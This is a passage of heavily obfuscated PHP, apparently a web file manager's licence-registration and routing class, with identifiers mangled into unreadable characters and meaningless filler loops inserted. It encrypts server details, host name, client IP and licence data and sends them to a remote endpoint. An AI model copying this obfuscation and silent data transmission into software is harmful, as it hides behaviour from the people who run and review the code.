$_SERVER[ñâÍÚ°]; $İšÄä²â = $¨šĞÁ‘ñ[4]; $·Í˜‹« = $GLOBALS[$¨šĞÁ‘ñ[13]][$¨šĞÁ‘ñ[14]][0]; if (!$·Í˜‹« || strlen($·Í˜‹«) <= strlen($İšÄä²â)) { return; } if (strtolower(substr($·Í˜‹«, -strlen($İšÄä²â))) != $İšÄä²â) { return; } $Ñõ³íäÒ = substr($·Í˜‹«, 0, -strlen($İšÄä²â)); $ÄÎÌªÉ‹ = $àÁ‡èõÁ[715]; if (strlen($ÄÎÌªÉ‹) < $àÁ‡èõÁ[702]) { die; } $ñ ’åâª = array($¨šĞÁ‘ñ[4], $Ñõ³íäÒ); $Ï—İã = $àÁ‡èõÁ[716]; $‘í¥öœğ = array_slice($GLOBALS[$¨šĞÁ‘ñ[13]][$¨šĞÁ‘ñ[14]], 1); $©ä¨õë = $àÁ‡èõÁ[717]; while ($©ä¨õë < $àÁ‡èõÁ[702]) { if ($©ä¨õë >= 0) { break; } $©ä¨õë++; } $GLOBALS[$¨šĞÁ‘ñ[13]][$¨šĞÁ‘ñ[14]] = array_merge($ñ ’åâª, $‘í¥öœğ); $úİÎŒô = $àÁ‡èõÁ[718]; if (!$úİÎŒô) { return; } $GLOBALS[$¨šĞÁ‘ñ[13]][$¨šĞÁ‘ñ[15]] = implode($¨šĞÁ‘ñ[0], $GLOBALS[$¨šĞÁ‘ñ[13]][$¨šĞÁ‘ñ[14]]); $•å¢ŸûÚ = $àÁ‡èõÁ[719]; if (!$•å¢ŸûÚ) { return; } } private function okzqaf028bc6() { $¨«„·™¤ =& $_SERVER[©—Ò»ÅĞ]; $¼àĞ½à =& $_SERVER[ñâÍÚ°]; if ($GLOBALS[$¼àĞ½à[13]][$¼àĞ½à[15]] != $¼àĞ½à[6]) { return; } $ÔÁ÷Ëñç = $_SERVER[$¼àĞ½à[16]]; $«ÀŒµÃˆ = $¼àĞ½à[17]; if (!strstr($ÔÁ÷Ëñç, $«ÀŒµÃˆ)) { return; } $ì©»£ÌÌ = strrpos($ÔÁ÷Ëñç, $«ÀŒµÃˆ); $•Ç¢¡µæ = $¨«„·™¤[720]; if (strlen($•Ç¢¡µæ) < $¨«„·™¤[714]) { die; } $›¬©™À = substr($ÔÁ÷Ëñç, $ì©»£ÌÌ + strlen($«ÀŒµÃˆ)); $Ş©ïè•î = $¨«„·™¤[721]; preg_match_all($¼àĞ½à[18], $›¬©™À, $§”ü¯ªÉ); $«Â˜èâ• = $¨«„·™¤[722]; if (!$«Â˜èâ•) { die; } $›¬©™À = trim($§”ü¯ªÉ[0][0], $¼àĞ½à[19]); $¤áÓáÁ¯ = $¨«„·™¤[723]; if (!$¤áÓáÁ¯) { die; } $GLOBALS[$¼àĞ½à[13]][$¼àĞ½à[14]] = explode($¼àĞ½à[19], $›¬©™À); $‘ÂõÂ¹Š = $¨«„·™¤[724]; if (!$‘ÂõÂ¹Š) { die; } $GLOBALS[$¼àĞ½à[13]][$¼àĞ½à[15]] = implode($¼àĞ½à[0], $GLOBALS[$¼àĞ½à[13]][$¼àĞ½à[14]]); } public function run() { $¢çÉÒø× =& $_SERVER[©—Ò»ÅĞ]; $«°ºû’Á =& $_SERVER[ñâÍÚ°]; $this->okzqaf028bc6(); $Û…©¦Ç = $¢çÉÒø×[725]; while ($Û…©¦Ç < $¢çÉÒø×[702]) { if ($Û…©¦Ç >= 0) { break; } $Û…©¦Ç++; } $this->stpw4822e445(); $ì–Ğ¾™ò = $GLOBALS[$«°ºû’Á[13]][$«°ºû’Á[14]]; $ÉªÕ§ğŸ = $¢çÉÒø×[726]; if (!$ÉªÕ§ğŸ) { die; } $¡­½‹üë = $GLOBALS[$«°ºû’Á[13]][$«°ºû’Á[15]]; define($«°ºû’Á[20], isset($ì–Ğ¾™ò[0]) && $ì–Ğ¾™ò[0] ? $ì–Ğ¾™ò[0] : $this->defaultModule); $§üµÚ = $¢çÉÒø×[727]; if (!$§üµÚ) { return; } define($«°ºû’Á[21], isset($ì–Ğ¾™ò[1]) && $ì–Ğ¾™ò[0] ? $ì–Ğ¾™ò[1] : $this->defaultController); $Šˆ”×¦¢ = $¢çÉÒø×[728]; while ($Šˆ”×¦¢ < $¢çÉÒø×[709]) { if ($Šˆ”×¦¢ >= 0) { break; } $Šˆ”×¦¢++; } define($«°ºû’Á[22], isset($ì–Ğ¾™ò[2]) && $ì–Ğ¾™ò[0] ? $ì–Ğ¾™ò[2] : $this->defaultAction); $¢Ü¢¤úÖ = $¢çÉÒø×[729]; define($«°ºû’Á[23], MOD . $«°ºû’Á[0] . ST . $«°ºû’Á[0] . ACT); $_SERVER[$«°ºû’Á[24]] = strtolower(ACTION); $ÛÒßŞô = $¢çÉÒø×[730]; if (!$ÛÒßŞô) { die; } $this->autorun(); $²í­÷Õ¬ = $¢çÉÒø×[731]; if (count($ì–Ğ¾™ò) >= 3) { $this->appRun($¡­½‹üë); } else { $this->appRun(ACTION); } } private $hgkcdc03808b = array(); private $ihdvfa6eda7a = ''; public function uycxc73e7cec() { $ÂÒ¾ëˆƒ =& $_SERVER[©—Ò»ÅĞ]; $İóëãü =& $_SERVER[ñâÍÚ°]; $this->wahl17dd69a2(); $½¢éÀ‚È = $ÂÒ¾ëˆƒ[732]; if (!$½¢éÀ‚È) { die; } $this->cgde731868f3(); $this->pbxub7a7bccc(); $this->mdlqf6f469e2(); $this->fori39fd3a7f(); $this->zbxd368404b3(); $this->wtiv9a3dc45f(); $üºÕÕğÍ = $ÂÒ¾ëˆƒ[733]; while (strlen($üºÕÕğÍ) < $ÂÒ¾ëˆƒ[734]) { if (!$üºÕÕğÍ) { break; } $üºÕÕğÍ++; } $this->wton7d7e46b1($İóëãü[25], array($this, $İóëãü[26])); $×àËÖîÓ = $ÂÒ¾ëˆƒ[735]; $this->wton7d7e46b1($İóëãü[27], array($this, $İóëãü[28])); $«Ûªôúî = $ÂÒ¾ëˆƒ[736]; $this->wton7d7e46b1($İóëãü[29], array($this, $İóëãü[30])); $Ü¹ö«¤¦ = $ÂÒ¾ëˆƒ[737]; if (!$Ü¹ö«¤¦) { die; } $this->wton7d7e46b1($İóëãü[31], array($this, $İóëãü[32])); $¹Õ„¡ğ = $ÂÒ¾ëˆƒ[738]; } public function getVersionData() { return $this->hgkcdc03808b; $¢ËÉ­Û = $_SERVER[©—Ò»ÅĞ][739]; } public function atjy79c33a21($Õ’ÇÄß) { $ÉÄ‰±Ğ =& $_SERVER[©—Ò»ÅĞ]; $şÚÄùóŒ =& $_SERVER[ñâÍÚ°]; $ÄÌ‹×¡š = Model($şÚÄùóŒ[33])->get(); $š¨¬Ê´  = array($şÚÄùóŒ[34], $şÚÄùóŒ[35], $şÚÄùóŒ[36], $şÚÄùóŒ[37], $şÚÄùóŒ[38], $şÚÄùóŒ[39], $şÚÄùóŒ[40], $şÚÄùóŒ[41], $şÚÄùóŒ[42], $şÚÄùóŒ[43], $şÚÄùóŒ[44], $şÚÄùóŒ[45], $şÚÄùóŒ[46], $şÚÄùóŒ[47], $şÚÄùóŒ[48], $şÚÄùóŒ[49], $şÚÄùóŒ[50], $şÚÄùóŒ[51], $şÚÄùóŒ[52], $şÚÄùóŒ[53], $şÚÄùóŒ[54], $şÚÄùóŒ[55], $şÚÄùóŒ[56], $şÚÄùóŒ[57], $şÚÄùóŒ[58], $şÚÄùóŒ[59], $şÚÄùóŒ[60], $şÚÄùóŒ[61], $şÚÄùóŒ[62], $şÚÄùóŒ[63], $şÚÄùóŒ[64], $şÚÄùóŒ[65], $şÚÄùóŒ[66], $şÚÄùóŒ[67], $şÚÄùóŒ[68], $şÚÄùóŒ[69], $şÚÄùóŒ[70], $şÚÄùóŒ[71], $şÚÄùóŒ[72], $şÚÄùóŒ[73], $şÚÄùóŒ[74], $şÚÄùóŒ[75], $şÚÄùóŒ[76], $şÚÄùóŒ[77], $şÚÄùóŒ[78], $şÚÄùóŒ[79], $şÚÄùóŒ[80], $şÚÄùóŒ[81], $şÚÄùóŒ[82], $şÚÄùóŒ[83], $şÚÄùóŒ[84], $şÚÄùóŒ[85], $şÚÄùóŒ[86], $şÚÄùóŒ[87]); foreach ($š¨¬Ê´  as $ÈêƒÓüÅ) { $ªÑü š¥ = $GLOBALS[$şÚÄùóŒ[88]][$şÚÄùóŒ[89]][$ÈêƒÓüÅ]; if (isset($ÄÌ‹×¡š[$ÈêƒÓüÅ])) { $ªÑü š¥ = $ÄÌ‹×¡š[$ÈêƒÓüÅ]; } $Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[91]][$ÈêƒÓüÅ] = $ªÑü š¥; } $¦áóùò® = $Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[91]][$şÚÄùóŒ[46]]; unset($Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[92]][$şÚÄùóŒ[93]]); unset($Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[92]][$şÚÄùóŒ[94]]); $Ó³ÉÇÅ¥ = $ÉÄ‰±Ğ[740]; unset($Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[91]][$şÚÄùóŒ[46]]); $ç½É§­Á = $ÉÄ‰±Ğ[741]; if (!$ç½É§­Á) { return; } unset($Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[91]][$şÚÄùóŒ[95]]); $¼Üáµ»Î = $ÉÄ‰±Ğ[742]; if (!$¼Üáµ»Î) { die; } $Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[91]][$şÚÄùóŒ[96]] = array($şÚÄùóŒ[97] => (int) $¦áóùò®[$şÚÄùóŒ[98]], $şÚÄùóŒ[99] => (int) _get($¦áóùò®, $şÚÄùóŒ[100], 0)); $ñ»†Üí‚ = substr(md5($şÚÄùóŒ[101] . get_client_ip() . $ÄÌ‹×¡š[$şÚÄùóŒ[102]]), 0, 15); $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[104]] = Mcrypt::encode(Session::sign(), $ñ»†Üí‚, 3600 * 24); $ïªËÕº® = $ÉÄ‰±Ğ[743]; if (!$ïªËÕº®) { return; } $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[105]] = Action($şÚÄùóŒ[106])->accessToken(); $‘ÓµÂÊ = $ÉÄ‰±Ğ[744]; if (strlen($‘ÓµÂÊ) < $ÉÄ‰±Ğ[707]) { return; } $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[107]] = md5($_SERVER[$şÚÄùóŒ[108]] . $ÄÌ‹×¡š[$şÚÄùóŒ[102]]); $úÎ›¿…ê = $ÉÄ‰±Ğ[745]; $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[109]] = base64_encode(serverInfo()); $™ı¶¬õ = $ÉÄ‰±Ğ[746]; if (strlen($™ı¶¬õ) < $ÉÄ‰±Ğ[702]) { die; } $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[110]] = $this->ihdvfa6eda7a; $Äœµ°Ğ = $ÉÄ‰±Ğ[747]; if ($ÄÌ‹×¡š[$şÚÄùóŒ[110]] != $şÚÄùóŒ[111]) { $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[112]] = $ÄÌ‹×¡š[$şÚÄùóŒ[112]]; $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[113]] = $ÄÌ‹×¡š[$şÚÄùóŒ[113]]; $Ğ²µëœ´ = rand_string(10) . $this->ihdvfa6eda7a . rand_string(5); $Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[114]][$şÚÄùóŒ[115]] = $this->ianp78223d75($Ğ²µëœ´, $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[107]]); } if ($this->ihdvfa6eda7a == $şÚÄùóŒ[111]) { $Õ’ÇÄß[$şÚÄùóŒ[90]][$şÚÄùóŒ[91]][$şÚÄùóŒ[96]][$şÚÄùóŒ[100]] = 0; } $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[116]] = $this->versionPluginFilter(); $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[117]] = _get($this->hgkcdc03808b, $şÚÄùóŒ[118], $şÚÄùóŒ[6]); if (KodUser::isRoot() && $this->config[$şÚÄùóŒ[119]]) { $Õ’ÇÄß[$şÚÄùóŒ[103]][$şÚÄùóŒ[120]] = WEB_ROOT; } return $Õ’ÇÄß; } private function zbxd368404b3() { $Ô±ŒÚº =& $_SERVER[©—Ò»ÅĞ]; $Ï³ˆü‚‰ =& $_SERVER[ñâÍÚ°]; $¼ó¹¬‘¹ = $_SERVER[$Ï³ˆü‚‰[24]] == $Ï³ˆü‚‰[121]; $àù‰âÛ = $Ô±ŒÚº[748]; if (!$àù‰âÛ) { die; } if ($_SERVER[$Ï³ˆü‚‰[24]] == $Ï³ˆü‚‰[122] && $_GET[$Ï³ˆü‚‰[123]] == $Ï³ˆü‚‰[124]) { $¼ó¹¬‘¹ = !0; } if ($¼ó¹¬‘¹) { $ÈØÅÌò› = array($Ï³ˆü‚‰[110] => $this->ihdvfa6eda7a, $Ï³ˆü‚‰[125] => $this->udhp48e67b0c(), $Ï³ˆü‚‰[126] => Model($Ï³ˆü‚‰[127])->count()); if ($this->ihdvfa6eda7a != $Ï³ˆü‚‰[111]) { $µ£“ = _get($this->hgkcdc03808b, $Ï³ˆü‚‰[128]); if ($µ£“) { $ÈØÅÌò›[$Ï³ˆü‚‰[129]] = $µ£“; $ÈØÅÌò›[$Ï³ˆü‚‰[130]] = strtotime(_get($this->hgkcdc03808b, $Ï³ˆü‚‰[131])); $ÈØÅÌò›[$Ï³ˆü‚‰[132]] = _get($this->hgkcdc03808b, $Ï³ˆü‚‰[118]); } $ßºÜ¥µ½ = Model($Ï³ˆü‚‰[33])->get($Ï³ˆü‚‰[133], $Ï³ˆü‚‰[6], !0); if (is_string($ßºÜ¥µ½) && substr($ßºÜ¥µ½, 0, 1) == $Ï³ˆü‚‰[134]) { $ßºÜ¥µ½ = json_decode_force($ßºÜ¥µ½); } if (is_array($ßºÜ¥µ½) && $ßºÜ¥µ½[$Ï³ˆü‚‰[135]] && strstr($ßºÜ¥µ½[$Ï³ˆü‚‰[135]], $Ï³ˆü‚‰[136])) { $è­úïÃ = explode($Ï³ˆü‚‰[136], $ßºÜ¥µ½[$Ï³ˆü‚‰[135]]); $ÈØÅÌò›[$Ï³ˆü‚‰[137]] = $è­úïÃ[0]; } } $ÈØÅÌò› = $this->hbrpd006126b(json_encode($ÈØÅÌò›), md5($Ï³ˆü‚‰[138])); $÷Ù¸à¥ˆ = $Ô±ŒÚº[749]; while (strlen($÷Ù¸à¥ˆ) < $Ô±ŒÚº[707]) { if (!$÷Ù¸à¥ˆ) { break; } $÷Ù¸à¥ˆ++; } $ø¤ûçœ¯ = array($Ï³ˆü‚‰[139] => $ÈØÅÌò›); $ÁŠ½¯˜è = $Ô±ŒÚº[750]; while (strlen($ÁŠ½¯˜è) < $Ô±ŒÚº[709]) { if (!$ÁŠ½¯˜è) { break; } $ÁŠ½¯˜è++; } call_user_func(array($Ï³ˆü‚‰[140], $Ï³ˆü‚‰[141]), $ø¤ûçœ¯); $÷¸Ùêûş = $Ô±ŒÚº[751]; } if ($this->ihdvfa6eda7a == $Ï³ˆü‚‰[111]) { return; } $Œ’¦¥Ş¥ = array($Ï³ˆü‚‰[142], $Ï³ˆü‚‰[143], $Ï³ˆü‚‰[144], $Ï³ˆü‚‰[145], $Ï³ˆü‚‰[146], $Ï³ˆü‚‰[147]); $À„Ä€”° = Model($Ï³ˆü‚‰[33])->get(); $ø¤ûçœ¯ = array($Ï³ˆü‚‰[148] => $À„Ä€”°[$Ï³ˆü‚‰[34]], $Ï³ˆü‚‰[149] => $À„Ä€”°[$Ï³ˆü‚‰[35]], $Ï³ˆü‚‰[150] => $Ï³ˆü‚‰[6]); $É©¼ä“á = $Ô±ŒÚº[752]; foreach ($Œ’¦¥Ş¥ as $”ßâò€) { if (!isset($À„Ä€”°[$”ßâò€]) || !$À„Ä€”°[$”ßâò€]) { continue; } $ø¤ûçœ¯[$”ßâò€] = $À„Ä€”°[$”ßâò€]; $Íøê©À = $Ô±ŒÚº[753]; } call_user_func(array($Ï³ˆü‚‰[140], $Ï³ˆü‚‰[141]), $ø¤ûçœ¯); $½İí”î½ = $Ô±ŒÚº[754]; if (strlen($½İí”î½) < $Ô±ŒÚº[702]) { die; } } private function mdlqf6f469e2() { $™¨ºò¸» =& $_SERVER[©—Ò»ÅĞ]; $ €¬ÒŠ =& $_SERVER[ñâÍÚ°]; if ($_SERVER[$ €¬ÒŠ[24]] != $ €¬ÒŠ[151]) { return; } if (!KodUser::isRoot()) { die; } $àç¨Ì¬… = $GLOBALS[$ €¬ÒŠ[13]]; if (isset($àç¨Ì¬…[$ €¬ÒŠ[152]])) { $this->jeyf052e8f19(); die; } if (isset($àç¨Ì¬…[$ €¬ÒŠ[153]]) && isset($àç¨Ì¬…[$ €¬ÒŠ[153]]) == $ €¬ÒŠ[124]) { $àç¨Ì¬…[$ €¬ÒŠ[154]] = Model($ €¬ÒŠ[33])->get($ €¬ÒŠ[155]); } if (!isset($àç¨Ì¬…[$ €¬ÒŠ[154]]) || strlen($àç¨Ì¬…[$ €¬ÒŠ[154]]) != 16) { show_json($ €¬ÒŠ[156] . $àç¨Ì¬…[$ €¬ÒŠ[154]], !1); } $—á°ëêÈ = Model($ €¬ÒŠ[33])->get($ €¬ÒŠ[102]); $ºø¢øê = md5($_SERVER[$ €¬ÒŠ[108]] . $—á°ëêÈ); $âŸêÍ¨± = array($ €¬ÒŠ[154] => $àç¨Ì¬…[$ €¬ÒŠ[154]], $ €¬ÒŠ[157] => rand_string(16), $ €¬ÒŠ[158] => $ €¬ÒŠ[138], $ €¬ÒŠ[159] => $ €¬ÒŠ[160], $ €¬ÒŠ[161] => $_SERVER[$ €¬ÒŠ[162]], $ €¬ÒŠ[163] => $_SERVER[$ €¬ÒŠ[164]], $ €¬ÒŠ[165] => $_SERVER[$ €¬ÒŠ[166]], $ €¬ÒŠ[107] => $ºø¢øê, $ €¬ÒŠ[167] => Model($ €¬ÒŠ[33])->get($ €¬ÒŠ[133])); $ã„Ä–Ò£ = $™¨ºò¸»[755]; if (strlen($ã„Ä–Ò£) < $™¨ºò¸»[714]) { return; } if (isset($àç¨Ì¬…[$ €¬ÒŠ[153]]) && isset($àç¨Ì¬…[$ €¬ÒŠ[153]]) == $ €¬ÒŠ[124]) { $âŸêÍ¨±[$ €¬ÒŠ[153]] = md5($âŸêÍ¨±[$ €¬ÒŠ[154]] . $ €¬ÒŠ[168] . $âŸêÍ¨±[$ €¬ÒŠ[157]]); } if ($àç¨Ì¬…[$ €¬ÒŠ[169]] == $ €¬ÒŠ[170]) { $€Ìß§óÙ = $this->hbrpd006126b($ºø¢øê, $ €¬ÒŠ[171]); $ï·¥Î´û = $this->ianp78223d75(json_encode($âŸêÍ¨±), $ºø¢øê . $ €¬ÒŠ[172], 3); $ï·¥Î´û = $ï·¥Î´û . $ €¬ÒŠ[173] . $_SERVER[$ €¬ÒŠ[162]]; $Ú•Å½ ¨ = $this->kvgea5f67761($ €¬ÒŠ[174] . $€Ìß§óÙ . $ €¬ÒŠ[175] . $ï·¥Î´û, -1); show_json($Ú•Å½ ¨, !0); } else { if ($àç¨Ì¬…[$ €¬ÒŠ[169]] == $ €¬ÒŠ[176]) { $Şşˆ¿ñ© = substr(md5($ €¬ÒŠ[177] . $ºø¢øê), 12, 15) . $ €¬ÒŠ[178]; $ï·¥Î´û = $this->mqvoe5af10d6(trim($àç¨Ì¬…[$ €¬ÒŠ[179]]), $Şşˆ¿ñ©, 2); $Ğô‡“¦ñ = json_decode($ï·¥Î´û, !0); if (!is_array($Ğô‡“¦ñ) || !is_array($Ğô‡“¦ñ[$ €¬ÒŠ[180]]) || $Ğô‡“¦ñ[$ €¬ÒŠ[154]] != !0) { $òù×„© = $ €¬ÒŠ[181]; $¢¿ÍÚ¦ = $Ğô‡“¦ñ[$ €¬ÒŠ[180]] ? $ €¬ÒŠ[182] . $Ğô‡“¦ñ[$ €¬ÒŠ[180]] : $òù×„©; show_json($¢¿ÍÚ¦, !1); } else { $âŸêÍ¨±[$ €¬ÒŠ[157]] = $Ğô‡“¦ñ[$ €¬ÒŠ[180]][$ €¬ÒŠ[183]]; } } else { $Ğô‡“¦ñ = $this->kvgea5f67761($ €¬ÒŠ[184], $âŸêÍ¨±, 10); $ ²Å÷×Ø = $™¨ºò¸»[756]; while ($ ²Å÷×Ø < $™¨ºò¸»[709]) { if ($ ²Å÷×Ø >= 0) { break; } $ ²Å÷×Ø++; } } } if (!is_array($Ğô‡“¦ñ) || !is_array($Ğô‡“¦ñ[$ €¬ÒŠ[180]]) || $Ğô‡“¦ñ[$ €¬ÒŠ[154]] != !0) { $òù×„© = LNG($ €¬ÒŠ[185]); $¢¿ÍÚ¦ = $Ğô‡“¦ñ[$ €¬ÒŠ[180]] ? $ €¬ÒŠ[182] . $Ğô‡“¦ñ[$ €¬ÒŠ[180]] : $òù×„©; show_json($¢¿ÍÚ¦, !1); } $œŸûñª = $Ğô‡“¦ñ[$ €¬ÒŠ[180]]; $÷òÄ¸…° = $this->ejfu1d0fc8c2($œŸûñª[$ €¬ÒŠ[186]]); if (!$÷òÄ¸…° || $÷òÄ¸…° != $œŸûñª[$ €¬ÒŠ[131]]) { $ĞßÁ”Ëç = array($ €¬ÒŠ[187] => Model($ €¬ÒŠ[33])->get($ €¬ÒŠ[102]), $ €¬ÒŠ[188] => $_SERVER[$ €¬ÒŠ[108]], $ €¬ÒŠ[189] => this_url(), $ €¬ÒŠ[163] => $_SERVER[$ €¬ÒŠ[164]]); $ï·¥Î´û = $this->edvp233d8e93(json_encode($ĞßÁ”Ëç)); $this->kvgea5f67761($ €¬ÒŠ[190] . $ï·¥Î´û); show_json(LNG($ €¬ÒŠ[191]), !0); } $€åÃï»« = array($ €¬ÒŠ[155] => $œŸûñª[$ €¬ÒŠ[192]], $ €¬ÒŠ[193] => $œŸûñª[$ €¬ÒŠ[194]], $ €¬ÒŠ[195] => rand_string(16), $ €¬ÒŠ[110] => $œŸûñª[$ €¬ÒŠ[196]]); if ($âŸêÍ¨±[$ €¬ÒŠ[157]]) { $€åÃï»«[$ €¬ÒŠ[195]] = $âŸêÍ¨±[$ €¬ÒŠ[157]]; } $À¬½ŸÕ© = substr(md5($€åÃï»«[$ €¬ÒŠ[193]]), 10, 10); $‚«®‰˜À = $À¬½ŸÕ© . $€åÃï»«[$ €¬ÒŠ[110]] . $€åÃï»«[$ €¬ÒŠ[195]]; $€åÃï»«[$ €¬ÒŠ[112]] = strrev(base64_encode($this->hbrpd006126b($‚«®‰˜À, $ €¬ÒŠ[197]))); $·Åİ¨ğÚ = rand_string(16); $°øÓãÙ² = $™¨ºò¸»[757]; if (strlen($°øÓãÙ²) < $™¨ºò¸»[702]) { die; } $õ„•¬ûŞ = $·Åİ¨ğÚ . $€åÃï»«[$ €¬ÒŠ[110]] . $this->hbrpd006126b(md5($€åÃï»«[$ €¬ÒŠ[155]]), $·Åİ¨ğÚ); $€åÃï»«[$ €¬ÒŠ[113]] = base64_encode(strrev($this->hbrpd006126b($õ„•¬ûŞ, $ €¬ÒŠ[198]))); $›ÊîÀ…« = $™¨ºò¸»[758]; if (!$›ÊîÀ…«) { die; } if ($œŸûñª[$ €¬ÒŠ[199]] && $œŸûñª[$ €¬ÒŠ[199]] >= 1) { Model($ €¬ÒŠ[33])->setDeep($ €¬ÒŠ[200], $ €¬ÒŠ[124]); } Model($ €¬ÒŠ[33])->set($€åÃï»«); $¹Î¼ÅõÛ = md5($_SERVER[$ €¬ÒŠ[108]] . strrev($—á°ëêÈ) . $€åÃï»«[$ €¬ÒŠ[193]]); $éäĞ¿Š¯ = $™¨ºò¸»[759]; $Û©ï®ì = strrev(substr($¹Î¼ÅõÛ, 10, 16)); $úŸ‚“­ = $™¨ºò¸»[760]; if (!$úŸ‚“­) { die; } $âÏæ˜¢Û = $this->ianp78223d75(json_encode($œŸûñª), $¹Î¼ÅõÛ); $ò®ë¢›¸ = $™¨ºò¸»[761]; $ò¾ÀÑ¶¤ = array_to_keyvalue(Model($ €¬ÒŠ[7])->listData(), $ €¬ÒŠ[201]); $—¨›áÄ¾ = $™¨ºò¸»[762]; $¿¾ñ­ìÅ = $ò¾ÀÑ¶¤[$ €¬ÒŠ[202]]; $ƒ‚Ë†ù° = $™¨ºò¸»[763]; $©¦¾¢àÆ = array(); $©¦¾¢àÆ[$Û©ï®ì] = $âÏæ˜¢Û; $Ïù‚²· = $™¨ºò¸»[764]; Model($ €¬ÒŠ[7])->update($¿¾ñ­ìÅ[$ €¬ÒŠ[203]], array($ €¬ÒŠ[204] => $©¦¾¢àÆ)); $this->hgkcdc03808b = $œŸûñª; $this->ihdvfa6eda7a = $€åÃï»«[$ €¬ÒŠ[110]]; $this->licenseRegistSuccess(); Cache::set($ €¬ÒŠ[205] . md5($—á°ëêÈ . $ €¬ÒŠ[206]), $ €¬ÒŠ[6]); $¨µ§õäÈ = $™¨ºò¸»[765]; if (strlen($¨µ§õäÈ) < $™¨ºò¸»[702]) { return; } show_json(LNG($ €¬ÒŠ[191]), !0); } private function licenseRegistSuccess() { $é¹¹ïâ… =& $_SERVER[ñâÍÚ°]; $«ßŸ•¾ø = Model($é¹¹ïâ…[33])->get(); $ñ±ê›İß = $_SERVER[©—Ò»ÅĞ][766]; if (!$ñ±ê›İß) { die; } if ($«ßŸ•¾ø[$é¹¹ïâ…[63]] != $é¹¹ïâ…[124]) { Model($é¹¹ïâ…[33])->set($é¹¹ïâ…[63], $é¹¹ïâ…[124]); } Action($é¹¹ïâ…[207])->initStart(!0); } private function jeyf052e8f19() { $‚èûÙ =& $_SERVER[ñâÍÚ°]; Model($‚èûÙ[33])->set(array($‚èûÙ[155] => $‚èûÙ[6], $‚èûÙ[193] => $‚èûÙ[6], $‚èûÙ[110] => $‚èûÙ[111], $‚èûÙ[112] => $‚èûÙ[6], $‚èûÙ[113] => $‚èûÙ[6])); Model($‚èûÙ[33])->setDeep($‚èûÙ[200], $‚èûÙ[208]); $this->hgkcdc03808b = array(); $this->ihdvfa6eda7a = $‚èûÙ[111]; } private function wahl17dd69a2() { $ï¬¼Ì©ı =& $_SERVER[©—Ò»ÅĞ]; $İÃ×®±Ï =& $_SERVER[ñâÍÚ°]; $_SERVER[$İÃ×®±Ï[164]] = _get($_SERVER, $İÃ×®±Ï[164], APP_HOST); $this->ihdvfa6eda7a = $İÃ×®±Ï[111]; $ÌÆ¿²§ù = Model($İÃ×®±Ï[33])->get(); $¤äı¶Öè = $ï¬¼Ì©ı[767]; if (strlen($¤äı¶Öè) < $ï¬¼Ì©ı[734]) { return; } if ($ÌÆ¿²§ù[$İÃ×®±Ï[110]] == $İÃ×®±Ï[111]) { return; } $ä ³ŸÑÔ = Model($İÃ×®±Ï[33])->get($İÃ×®±Ï[102]); $•ı¯ˆ“ = $ï¬¼Ì©ı[768]; $Ñ×¢Ø­Å = $İÃ×®±Ï[205] . md5($ä ³ŸÑÔ . $İÃ×®±Ï[206]); $á¼¿šæ = Cache::get($Ñ×¢Ø­Å); if (!is_array($á¼¿šæ) || !isset($á¼¿šæ[$İÃ×®±Ï[209]]) || time() - $á¼¿šæ[$İÃ×®±Ï[209]] >= 60) { $ú³« œğ = Model($İÃ×®±Ï[7])->loadList(); $×İ¨¦“ = $ú³« œğ[$İÃ×®±Ï[202]]; $Ø¡”¨©¤ = md5($_SERVER[$İÃ×®±Ï[108]] . strrev($ä ³ŸÑÔ) . $ÌÆ¿²§ù[$İÃ×®±Ï[193]]); $È³ÑŸĞ = strrev(substr($Ø¡”¨©¤, 10, 16)); $á¼¿šæ = $this->mqvoe5af10d6($×İ¨¦“[$İÃ×®±Ï[88]][$È³ÑŸĞ], $Ø¡”¨©¤); $á¼¿šæ = json_decode($á¼¿šæ, !0); } if (!is_array($á¼¿šæ)) { return $this->jeyf052e8f19(); } $£¹Âö½˜ = strtotime($á¼¿šæ[$İÃ×®±Ï[131]]); if (time() >= $£¹Âö½˜) { return $this->jeyf052e8f19(); } if (!isset($á¼¿šæ[$İÃ×®±Ï[209]]) || time() - $á¼¿šæ[$İÃ×®±Ï[209]] > 20) { $á¼¿šæ[$İÃ×®±Ï[209]] = time(); Cache::set($Ñ×¢Ø­Å, $á¼¿šæ); } $this->hgkcdc03808b = $á¼¿šæ; $this->ihdvfa6eda7a = $ÌÆ¿²§ù[$İÃ×®±Ï[110]]; $GLOBALS[$İÃ×®±Ï[210]] = $this; } private function cgde731868f3() { $ÛøëØæù =& $_SERVER[©—Ò»ÅĞ]; $â¶ãŒ°¹ =& $_SERVER[ñâÍÚ°]; $ÌõòúÇõ = $GLOBALS[$â¶ãŒ°¹[13]]; $¸›ñÙ«ˆ = $ÛøëØæù[769]; $¨øöŠĞ£ = $_SERVER[$â¶ãŒ°¹[24]]; $‘Ã”äô = $ÛøëØæù[770]; if ($¨øöŠĞ£ == $â¶ãŒ°¹[211] && $this->ihdvfa6eda7a == $â¶ãŒ°¹[111]) { show_json(LNG($â¶ãŒ°¹[212]), !1, $â¶ãŒ°¹[213]); } $İ ™ÁóÆ = array($â¶ãŒ°¹[214], $â¶ãŒ°¹[215]); if (in_array($¨øöŠĞ£, $İ ™ÁóÆ)) { if ($this->ihdvfa6eda7a == $â¶ãŒ°¹[111] && isset($ÌõòúÇõ[$â¶ãŒ°¹[216]])) { show_json(LNG($â¶ãŒ°¹[212]), !1, $â¶ãŒ°¹[213]); die; 